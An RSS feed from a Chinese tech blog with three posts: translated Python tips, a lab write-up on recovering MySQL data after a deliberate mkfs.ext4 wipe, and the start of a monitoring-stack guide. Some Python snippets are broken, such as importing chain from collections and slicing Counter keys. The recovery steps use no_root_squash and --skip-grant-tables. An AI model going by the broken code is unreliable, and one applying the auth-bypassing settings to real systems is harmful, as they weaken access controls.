<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>找节拍</title>
    <link>http://inorz.net/index.xml</link>
    <description>Recent content on 找节拍</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>©2015-2017 ღ fuqihuan</copyright>
    <lastBuildDate>Tue, 25 Apr 2017 22:05:48 +0000</lastBuildDate>
    <atom:link href="http://inorz.net/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>我希望初学Python时就能知道的一些用法</title>
      <link>http://inorz.net/2017/04/25/I-wish-I-knew-these-things-when-I-learned-Python/</link>
      <pubDate>Tue, 25 Apr 2017 22:05:48 +0000</pubDate>
      
      <guid>http://inorz.net/2017/04/25/I-wish-I-knew-these-things-when-I-learned-Python/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;有时候我反问我自己，怎么不知道在Python 3中用更简单的方式做“这样”的事，当我寻求答案时，随着时间的推移，我当然发现更简洁、有效并且bug更少的代码。
总的来说（不仅仅是这篇文章），“那些”事情总共数量是超过我想象的，但这里是第一批不明显的特性，后来我寻求到了更有效，更简单且可维护的代码。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;字典中的keys()和items()
你能在字典的keys和items中做很多有意思的操作，它们类似于集合（set）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;aa = {&#39;mike&#39;: &#39;male&#39;, &#39;kathy&#39;: &#39;female&#39;, &#39;steve&#39;: &#39;male&#39;, &#39;hillary&#39;: &#39;female&#39;}
    
bb = {&#39;mike&#39;: &#39;male&#39;, &#39;ben&#39;: &#39;male&#39;, &#39;hillary&#39;: &#39;female&#39;}
    
aa.keys() &amp;amp; bb.keys() # {&#39;mike&#39;, &#39;hillary&#39;} # these are set-like
aa.keys() - bb.keys() # {&#39;kathy&#39;, &#39;steve&#39;}
# If you want to get the common key-value pairs in the two dictionaries
aa.items() &amp;amp; bb.items() # {(&#39;mike&#39;, &#39;male&#39;), (&#39;hillary&#39;, &#39;female&#39;)}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;太简洁啦！&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;在字典中校验一个key的存在。下面这段代码你写了多少遍了？&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;dictionary = {}
for k, v in ls:
    if not k in dictionary:
        dictionary[k] = []
    dictionary[k].append(v)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码其实没有那么糟糕，但是为什么你一直都需要用if语句呢？&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from collections import defaultdict
dictionary = defaultdict(list) # defaults to list
for k, v in ls:
    dictionary[k].append(v)
这样就更清晰了，没有一个多余而模糊的if语句。
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;用另一个字典来更新一个字典&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from itertools import chain
a = {&#39;x&#39;: 1, &#39;y&#39;:2, &#39;z&#39;:3}
b = {&#39;y&#39;: 5, &#39;s&#39;: 10, &#39;x&#39;: 3, &#39;z&#39;: 6}
    
# Update a with b 
c = dict(chain(a.items(), b.items()))
c # {&#39;y&#39;: 5, &#39;s&#39;: 10, &#39;x&#39;: 3, &#39;z&#39;: 6}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样看起来还不错，但是不够简明。看看我们是否能做得更好：&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;   c = a.copy()
   c.update(b)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;更清晰而且更有可读性了！
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;从一个字典获得最大值&lt;/p&gt;

&lt;p&gt;如果你想获取一个字典中的最大值，可能会像这样直接：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;aa = {k: sum(range(k)) for k in range(10)}
aa # {0: 0, 1: 0, 2: 1, 3: 3, 4: 6, 5: 10, 6: 15, 7: 21, 8: 28, 9: 36}
max(aa.values()) #36
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这么做是有效的，但是如果你需要key，那么你就需要在value的基础上再找到key。然而，我们可以用过zip来让展现更扁平化，并返回一个如下这样的key-value形式：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;max(zip(aa.values(), aa.keys()))
# (36, 9) =&amp;gt; value, key pair
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样地，如果你想从最大到最小地去遍历一个字典，你可以这么干：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;sorted(zip(aa.values(), aa.keys()), reverse=True)
# [(36, 9), (28, 8), (21, 7), (15, 6), (10, 5), (6, 4), (3, 3), (1, 2), (0, 1), (0, 0)]
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;在一个list中打开任意数量的items
我们可以运用*的魔法，获取任意的items放到list中：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def compute_average_salary(person_salary):
    person, *salary = person_salary
    return person, (sum(salary) / float(len(salary)))
    
person, average_salary = compute_average_salary([“mike”, 40000, 50000, 60000])
person # &#39;mike&#39;
average_salary # 50000.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这不是那么有趣，但是如果我告诉你也可以像下面这样呢：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def compute_average_salary(person_salary_age):
    person, *salary, age = person_salary_age
    return person, (sum(salary) / float(len(salary))), age
    
person, average_salary, age = compute_average_salary([“mike”, 40000, 50000, 60000, 42])
age # 42
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看起来很简洁嘛!&lt;/p&gt;

&lt;p&gt;当你想到有一个字符串类型的key和一个list的value的字典，而不是遍历一个字典，然后顺序地处理value，你可以使用一个更扁平的展现(list中套list)，像下面这样:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# Instead of doing this
for k, v in dictionary.items():
    process(v)
    
# we are separating head and the rest, and process the values
# as a list similar to the above. head becomes the key value
for head, *rest in ls:
    process(rest)
    
# if not very clear, consider the following example
aa = {k: list(range(k)) for k in range(5)} # range returns an iterator
aa # {0: [], 1: [0], 2: [0, 1], 3: [0, 1, 2], 4: [0, 1, 2, 3]}
for k, v in aa.items():
    sum(v)
    
#0
#0
#1
#3
#6
    
# Instead
aa = [[ii] + list(range(jj)) for ii, jj in enumerate(range(5))]
for head, *rest in aa:
    print(sum(rest))
    
#0
#0
#1
#3
#6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;你可以把list解压成head，*rest,tail等等。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Collections用作计数器
Collections是我在python中最喜欢的库之一，在python中，除了原始的默认的，如果你还需要其他的数据结构，你就应该看看这个。&lt;/p&gt;

&lt;p&gt;我日常基本工作的一部分就是计算大量而又不是很重要的词。可能有人会说，你可以把这些词作为一个字典的key，他们分别的值作为value，在我没有接触到collections中的Counter时，我可能会同意你的做法（是的，做这么多介绍就是因为Counter）。&lt;/p&gt;

&lt;p&gt;假设你读的python语言的维基百科，转化为一个字符串，放到一个list中（标记好顺序）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import re
word_list = list(map(lambda k: k.lower().strip(), re.split(r&#39;[;,:(.s)]s*&#39;, python_string)))
word_list[:10] # [&#39;python&#39;, &#39;is&#39;, &#39;a&#39;, &#39;widely&#39;, &#39;used&#39;, &#39;general-purpose&#39;, &#39;high-level&#39;, &#39;programming&#39;, &#39;language&#39;, &#39;[17][18][19]&#39;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;到目前为止看起来都不错，但是如果你想计算这个list中的单词：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from collections import defaultdict # again, collections!
dictionary = defaultdict(int)
for word in word_list:
    dictionary[word] += 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个没有那么糟糕，但是如果你有了Counter，你将会节约下你的时间做更有意义的事情。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from collections import Counter
counter = Counter(word_list)
# Getting the most common 10 words
counter.most_common(10)
[(&#39;the&#39;, 164), (&#39;and&#39;, 161), (&#39;a&#39;, 138), (&#39;python&#39;, 138), 
(&#39;of&#39;, 131), (&#39;is&#39;, 102), (&#39;to&#39;, 91), (&#39;in&#39;, 88), (&#39;&#39;, 56)]
counter.keys()[:10] # just like a dictionary
[&#39;&#39;, &#39;limited&#39;, &#39;all&#39;, &#39;code&#39;, &#39;managed&#39;, &#39;multi-paradigm&#39;, 
&#39;exponentiation&#39;, &#39;fromosing&#39;, &#39;dynamic&#39;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;很简洁吧，但是如果我们看看在Counter中包含的可用的方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;dir(counter)
[&#39;__add__&#39;, &#39;__and__&#39;, &#39;__class__&#39;, &#39;__cmp__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dict__&#39;, 
&#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, 
&#39;__init__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__missing__&#39;, &#39;__module__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, 
&#39;__or__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, 
&#39;__str__&#39;, &#39;__sub__&#39;, &#39;__subclasshook__&#39;, &#39;__weakref__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;elements&#39;, &#39;fromkeys&#39;, &#39;get&#39;, 
&#39;has_key&#39;, &#39;items&#39;, &#39;iteritems&#39;, &#39;iterkeys&#39;, &#39;itervalues&#39;, &#39;keys&#39;, &#39;most_common&#39;, &#39;pop&#39;, &#39;popitem&#39;, &#39;setdefault&#39;, 
&#39;subtract&#39;, &#39;update&#39;, &#39;values&#39;, &#39;viewitems&#39;, &#39;viewkeys&#39;, &#39;viewvalues&#39;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;你看到add和sub方法了吗，是的，Counter支持加减运算。因此，如果你有很多文本想要去计算单词，你不必需要Hadoop，你可以运用Counter(作为map)然后把它们加起来（相当于reduce）。这样你就有构建在Counter上的mapreduce了，你可能以后还会感谢我。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;扁平嵌套lists
Collections也有_chain函数，其可被用作扁平嵌套lists&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from collections import chain
ls = [[kk] + list(range(kk)) for kk in range(5)]
flattened_list = list(collections._chain(*ls))
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;同时打开两个文件
如果你在处理一个文件（比如一行一行地），而且要把这些处理好的行写入到另一个文件中，你可能情不自禁地像下面这么去写：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;with open(input_file_path) as inputfile:
    with open(output_file_path, &#39;w&#39;) as outputfile:
        for line in inputfile:
            outputfile.write(process(line))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;除此之外，你可以在相同的一行里打开多个文件，就像下面这样：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;with open(input_file_path) as inputfile, open(output_file_path, &#39;w&#39;) as outputfile:
    for line in inputfile:
        outputfile.write(process(line))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样就更简洁啦！&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;从一堆数据中找到星期一
如果你有一个数据想去标准化（比如周一之前或是之后），你也许会像下面这样：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import datetime
previous_monday = some_date - datetime.timedelta(days=some_date.weekday())
# Similarly, you could map to next monday as well
next_monday = some_date + date_time.timedelta(days=-some_date.weekday(), weeks=1)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;处理HTML
如果你出于兴趣或是利益要爬一个站点，你可能会一直面临着html标签。为了去解析各种各样的html标签，你可以运用html.parer：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from html.parser import HTMLParser
    
class HTMLStrip(HTMLParser):
    
    def __init__(self):
        self.reset()
        self.ls = []
    
    def handle_data(self, d):
        self.ls.append(d)
    
    def get_data(self):
        return &#39;&#39;.join(self.ls)
    
    @staticmethod
    def strip(snippet):
        html_strip = HTMLStrip()
        html_strip.feed(snippet)
        clean_text = html_strip.get_data()
        return clean_text
    
snippet = HTMLStrip.strip(html_snippet)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果你仅仅想避开html：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;escaped_snippet = html.escape(html_snippet)
    
# Back to html snippets(this is new in Python 3.4)
html_snippet = html.unescape(escaped_snippet)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
&lt;p&gt;本文为转载: &lt;a href=&#34;http://www.opscoder.info/python_learner.html&#34;&gt;译文地址&lt;/a&gt; |  &lt;a href=&#34;http://bugra.github.io/work/notes/2015-01-03/i-wish-i-knew-these-things-when-i-first-learned-python/&#34;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    
    <item>
      <title>Linux下恢复被格了硬盘的MySQL数据</title>
      <link>http://inorz.net/2017/04/19/linux-restore-mysql-data/</link>
      <pubDate>Wed, 19 Apr 2017 18:35:48 +0000</pubDate>
      
      <guid>http://inorz.net/2017/04/19/linux-restore-mysql-data/</guid>
      <description>&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;前段时间运维事故也不少，大都是删库无备份到跑路这种级别的事故，于是模拟了一次这样的灾难，做了次恢复实验。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;前期准备&#34;&gt;前期准备&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;找了个有数据的后台数据机器，将整台机器的 MySQL 数据恢复到一台测试机里。&lt;/li&gt;
&lt;li&gt;验证数据都进来后，对测试机进行一个可怕的操作: mkfs.ext4&lt;/li&gt;
&lt;li&gt;开始模拟恢复数据。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;抢救前戏&#34;&gt;抢救前戏&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;假装发现磁盘数据清空后，做做样子去找了一下之前有没有拉过备份。&lt;/li&gt;
&lt;li&gt;假装找遍了机器。发现没有。然后就接着恢复数据。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;操作步骤&#34;&gt;操作步骤：&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;先恢复分区里面的数据&lt;/li&gt;
&lt;li&gt;用恢复出来的数据使mysql启动起来，然后看数据能否正常开启来。并做逻辑备份。并拉到另一台机器恢复。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;准备恢复工具&#34;&gt;准备恢复工具&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;下载 extundelete：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget https://sourceforge.net/projects/extundelete/files/latest/download --no-check-certificate
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;编译安装：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;tar xf .extundelete-0.2.4.tar.bz2
cd extundelete-0.2.4/
./configure --prefix=/usr/local/extundelete
make &amp;amp;&amp;amp; make install
# 检查是否安装成功：
/usr/local/extundelete/bin/extundelete -v
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;开始恢复&#34;&gt;开始恢复：&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;首先把目标磁盘卸载下来，避免有其他第三方程序还往磁盘上读写文件&lt;/li&gt;

&lt;li&gt;&lt;p&gt;查看下目标磁盘sdb1上面的文件状态：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./extundelete /dev/sdb1 --inode 2
# 注:一般一个分区挂载到一个目录下时，这个”根”目录的inode值为2，我们为了查看根目录所有文件，所以查看分区inode为2的这个部分
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 800 groups loaded.
Group: 0
Contents of inode 2:
########## 省略一大坨 ############
File name                                       | Inode number | Deleted status
.                                                 2
..                                                2
home                                              2310145
logs                                              5718017
tmp_agent_IN1nBf                                  11             Deleted
backup                                            2236417        Deleted
tmp                                               3399681        Deleted
database                                          4014081        Deleted
########## 继续省略一大坨 ############
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
&lt;p&gt;上面列出了被格掉的文件。这里已经看到了要恢复的目录。这时需要准备另外一块硬盘来恢复目标文件。
由于真实机器是固定的。于是重新创建了一台机器，用NFS挂载远程另一台机器的磁盘来解决。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 服务端（找着了台centos机器做NFS服务端）
echo &#39;/data/tmp IP(rw,sync,no_root_squash)&#39; &amp;gt;&amp;gt; /etc/exports
/etc/init.d/rpcbind start
/etc/init.d/nfs start
    
# 客户端（挂载）
mount -o nolock -t nfs IP:/data/tmp /mnt
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;开始恢复（我们的数据存放在database下，只需要恢复这个目录即可）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 恢复目录先做个软链接到刚刚挂载的NFS磁盘上。
mkdir -p /mnt/RECOVERED_FILES &amp;amp;&amp;amp; ln -s /mnt/RECOVERED_FILES /usr/local/extundelete/bin/
    
# 开始恢复
/usr/local/extundelete/bin/extundelete /dev/sdb1 --restore-directory database
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 800 groups loaded.
Loading journal descriptors ... 26244 descriptors loaded.
Searching for recoverable inodes in directory database ...
331 recoverable inodes found.
Looking through the directory structure for deleted files ...
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;恢复完后即可在对应的目录里看到恢复出来的文件。下面介绍一下extundelete的其他参数：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&amp;ndash;after dtime : 只恢复指定时间【dtime】（时间戳）之后，被删除的数据&lt;/li&gt;
&lt;li&gt;&amp;ndash;before dtime : 只恢复指定时间【dtime】（时间戳）之前，被删除的数据&lt;/li&gt;
&lt;li&gt;&amp;ndash;restore-inode : 恢复一个或多个指定inode号的文件，该恢复的文件名为【file.$inode】&lt;/li&gt;
&lt;li&gt;&amp;ndash;restore-file : 恢复指定的文件（被删除的），文件名还是原来的&lt;/li&gt;
&lt;li&gt;&amp;ndash;restore-files : 恢复指定的文件（真实存在的）中的内容&lt;/li&gt;
&lt;li&gt;&amp;ndash;restore-directory : 恢复指定的目录&lt;/li&gt;
&lt;li&gt;&amp;ndash;restore-all : 恢复某分区里所有被删除的数据，文件名还是原来的&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;恢复mysql数据库&#34;&gt;恢复MySQL数据库&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;这里主要做的是修改一下my.conf，将datadir指向刚刚还原出来的数据库目录，然后启动MySQL&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost database]# /usr/local/services/mysql/bin/mysqld_safe &amp;amp;
# 不出所料，启动挂掉。看了报错信息，有以下内容
InnoDB: Reading tablespace information from the .ibd files...
InnoDB: Restoring possible half-written data pages from the doublewrite
InnoDB: buffer...
InnoDB: Doing recovery: scanned up to log sequence number 9120034833
170322 13:12:51 InnoDB: Starting an apply batch of log records to the database...
InnoDB: Progress in percents: 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 160822 13:12:51 [ERROR] mysqld got signal 11 ;
This could be because you hit a bug. It is also possible that this binary
or one of the libraries it was linked against is corrupt, improperly built,
or misconfigured. This error can also be caused by malfunctioning hardware.
To report this bug, see http://kb.askmonty.org/en/reporting-bugs
We will try our best to scrape up some info that will hopefully help
diagnose the problem, but since we have already crashed, 
something is definitely wrong and this may fail.
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;这里主要关注 mysqld got signal 11 ，从日志内容分析来看，应该是上一步恢复出来的文件是不完整的，日志文件损坏，无法正常恢复。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;因为日志已经损坏，这里采用非常规手段，首先修改innodb_force_recovery参数，使mysqld跳过恢复步骤，将mysqld 启动,将数据导出来然后重建数据库。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;innodb_force_recovery可以设置为1-6,大的数字包含前面所有数字的影响。

&lt;ol&gt;
&lt;li&gt;(SRV_FORCE_IGNORE_CORRUPT):忽略检查到的corrupt页。&lt;/li&gt;
&lt;li&gt;(SRV_FORCE_NO_BACKGROUND):阻止主线程的运行，如主线程需要执行full purge操作，会导致crash。&lt;/li&gt;
&lt;li&gt;(SRV_FORCE_NO_TRX_UNDO):不执行事务回滚操作。&lt;/li&gt;
&lt;li&gt;(SRV_FORCE_NO_IBUF_MERGE):不执行插入缓冲的合并操作。&lt;/li&gt;
&lt;li&gt;(SRV_FORCE_NO_UNDO_LOG_SCAN):不查看重做日志，InnoDB存储引擎会将未提交的事务视为已提交。&lt;/li&gt;
&lt;li&gt;(SRV_FORCE_NO_LOG_REDO):不执行前滚的操作。&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;注意&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;当设置参数值大于0后，可以对表进行select,create,drop操作，但insert,update或者delete这类操作是不允许的。&lt;/li&gt;

&lt;li&gt;&lt;p&gt;当innodb_purge_threads 和 innodb_force_recovery一起设置会出现一种loop现象:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;170322 14:20:42 InnoDB: Waiting for the background threads to start
170322 14:20:43 InnoDB: Waiting for the background threads to start
170322 14:20:44 InnoDB: Waiting for the background threads to start
170322 14:20:45 InnoDB: Waiting for the background threads to start
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;在my.cnf中修改以下两个参数&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;innodb_force_recovery=1
innodb_purge_thread=0
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;重启MySQL，因为mysql root密码文件也没了，这里我们用安全模式启动：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/usr/local/services/mysql/bin/mysqld_safe --skip-grant-tables &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;数据库开启来了。这时候正常来说应该可以松一口气，用mysqldump来个逻辑备份了。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;test -d /mnt/backup/ || mkdir -p /mnt/backup/
mysqldump database &amp;gt; /mnt/backup/database.sql
### 分隔线 ###
mysqldump: Couldn&#39;t execute &#39;show create table `xxxxxxx`&#39;: File &#39;./database/xxxxxxx.MYD&#39; not found (Errcode: 2) (29)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;按上面的报错到数据目录看了下，傻眼了，库里有MyISAM引擎的表。而且还是MYD丢失了。只剩下了.frm和.MYI。搜了一圈，没找着合适的方法。最后对比了下原备份的数据。报的这几个表里面都是没有数据或是一些不重要的数据。于是可以放心的干掉这几个有问题的表。只恢复重要的数据。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安全起见，还是用了一下mysqlcheck来修复了一下数据库。mysqlcheck database
运气较好，这几个丢的MYD的表都是些没数据或是不重要的表。去掉后继续 mysqldump 数据。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysqldump database &amp;gt; /mnt/backup/database.sql  
### 分隔线 ###
mysqldump: Got error: 1146: Table &#39;&#39; doesn&#39;t exist when using LOCK TABLES
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;还来。。这回的是innoDB的表有问题，按上面报错的话。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;一般是以下几个原因：

&lt;ul&gt;
&lt;li&gt;已经删除且重新创建了 InnoDB 数据文件，但是忘了从数据库目录删除相应的 InnoDB 表的 .frm 文件，或者您已经移动 .frm 文件到其它的数据库。检查 show tables&lt;/li&gt;
&lt;li&gt;mysql 数据目录中表文件的权限和所有权不正确&lt;/li&gt;
&lt;li&gt;表文件已被损坏&lt;/li&gt;
&lt;li&gt;表文件是用大写形式创建的&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;解决方法

&lt;ul&gt;
&lt;li&gt;检查 show tables，如果未列举表文件，请将 .frm 文件移出数据库目录&lt;/li&gt;
&lt;li&gt;mysql 数据目录中表文件的权限和所有权不正确，理想的所有权限应为 mysql 用户和权限 660。&lt;/li&gt;
&lt;li&gt;修复表文件&lt;/li&gt;
&lt;li&gt;设置 lower_case_table_names&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;看了其他几条，都不是。只能是恢复数据的时候没有恢复完。丢失了.idb文件。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;这次实验的运气还是比较好，丢失的.idb表也是一直不重要的表。直接把.frm文件移了出去。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;重新mysqldump试试&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysqldump database &amp;gt; /mnt/backup/database.sql
### 分隔线 ###
echo $?
### 分隔线 ###
0
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;成功备份&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;备份非常重要。&lt;/li&gt;
&lt;li&gt;生产环境，用非 root 用户操作，能大大减少误操作的概率。&lt;/li&gt;
&lt;li&gt;恢复过程中，有会丢失个别表数据的情况，虽然说这些数据对于我们这次实验的数据来说不太重要。但如果发生在真实环境中，刚好丢失了重要的数据，那真是欲哭无泪了。&lt;/li&gt;
&lt;li&gt;真实环境中，如果需要快速恢复业务，那么中间遇到的几个表异常，应该先确认是否为重要数据，如不重要直接跳过先恢复有用的数据。后面的再想办法恢复。&lt;/li&gt;
&lt;li&gt;希望这种数据恢复，只在实验环境中出现。&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>InfluxDB、Glances和Grafana构建现代化监控系统</title>
      <link>http://inorz.net/2016/05/22/InfluxDB-Grafana-Glances-monitor/</link>
      <pubDate>Sun, 22 May 2016 23:55:48 +0000</pubDate>
      
      <guid>http://inorz.net/2016/05/22/InfluxDB-Grafana-Glances-monitor/</guid>
      <description>&lt;p&gt;今天的主角是InfluxDB、Glances、Grafana这三个工具，三个工作都非常强大。可以用于组件一个比较强大的分布式监控系统了，关键是文档也比较齐全。&lt;/p&gt;

&lt;p&gt;简单介绍一下这三款软件：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://influxdata.com&#34;&gt;InfluxDB&lt;/a&gt;: InfluxDB 是一个开源，分布式，时间序列，事件，可度量和无外部依赖的数据库。&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://nicolargo.github.io/glances/&#34;&gt;Glances&lt;/a&gt;: glances 是一款用于 Linux、BSD 的开源命令行系统监视工具，它使用 Python 语言开发，能够监视 CPU、负载、内存、磁盘 I/O、网络流量、文件系统、系统温度等信息。本文介绍 glances 的使用方法和技巧，帮助 Linux 系统管理员了解掌握服务器性能。&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://grafana.org/&#34;&gt;Grafana&lt;/a&gt;: grafana 是一款采用go 语言编写的开源应用，主要用于大规模指标数据的可视化展现。&lt;/li&gt;
